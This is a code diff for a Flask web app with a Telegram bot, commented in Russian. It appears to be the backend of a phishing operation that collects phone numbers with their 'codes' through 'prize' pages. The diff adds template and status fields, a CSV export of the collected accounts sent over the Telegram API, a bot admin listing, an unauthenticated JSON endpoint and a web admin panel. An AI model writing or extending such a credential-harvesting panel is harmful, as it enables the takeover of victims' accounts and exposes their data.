@@ -32,13 +32,14 @@ def init_db():
     """)
     conn.commit()
     conn.close()
+    logging.info("✅ База данных инициализирована")
 
 init_db()
 
 def get_all_accounts():
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
-    cursor.execute("SELECT phone, code, created_at FROM accounts ORDER BY created_at DESC")
+    cursor.execute("SELECT phone, code, template, status, created_at FROM accounts ORDER BY created_at DESC")
     rows = cursor.fetchall()
     conn.close()
     return rows
@@ -143,10 +144,10 @@ def webhook():
                 send_message(chat_id, "📭 Нет данных.")
                 return "OK", 200
 
-            csv = "Телефон,Код,Дата\n"
-            for phone, code, created_at in rows:
+            csv = "Телефон,Код,Шаблон,Статус,Дата\n"
+            for phone, code, template, status, created_at in rows:
                 date = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M:%S")
-                csv += f"{phone},{code},{date}\n"
+                csv += f"{phone},{code},{template},{status},{date}\n"
 
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
             files = {"document": ("accounts.csv", csv)}
@@ -158,7 +159,7 @@ def webhook():
 
     return "OK", 200
 
-# ========== АДМИН-ПАНЕЛЬ ==========
+# ========== АДМИН-ПАНЕЛЬ В БОТЕ ==========
 def show_admin_panel(chat_id):
     rows = get_all_accounts()
     if not rows:
@@ -166,9 +167,9 @@ def show_admin_panel(chat_id):
         return
 
     msg = "📋 **База данных (последние 10):**\n\n"
-    for i, (phone, code, created_at) in enumerate(rows[:10], 1):
+    for i, (phone, code, template, status, created_at) in enumerate(rows[:10], 1):
         date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
-        msg += f"{i}. 📱 `{phone}` | 🔑 `{code}` | 🕒 {date}\n"
+        msg += f"{i}. 📱 `{phone}` | 🔑 `{code}` | 🎭 {template} | 🕒 {date}\n"
 
     keyboard = {
         "inline_keyboard": [
@@ -177,6 +178,26 @@ def show_admin_panel(chat_id):
         ]
     }
     send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")
+
+# ========== API ДЛЯ ВЕБ-АДМИНКИ ==========
+@app.route("/api/accounts")
+def api_accounts():
+    rows = get_all_accounts()
+    result = []
+    for phone, code, template, status, created_at in rows:
+        result.append({
+            "phone": phone,
+            "code": code,
+            "template": template,
+            "status": status,
+            "created_at": created_at
+        })
+    return json.dumps(result)
+
+# ========== ВЕБ-АДМИНКА ==========
+@app.route("/panel")
+def admin_panel():
+    return send_file("admin_panel.html")
 
 # ========== НАСТРОЙКА ВЕБХУКА ==========
 @app.route("/setwebhook", methods=["GET", "POST"])
@@ -201,6 +222,7 @@ def prize():
 def prize2():
     return send_file("index2.html")
 
+# ========== ЗАПУСК ==========
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
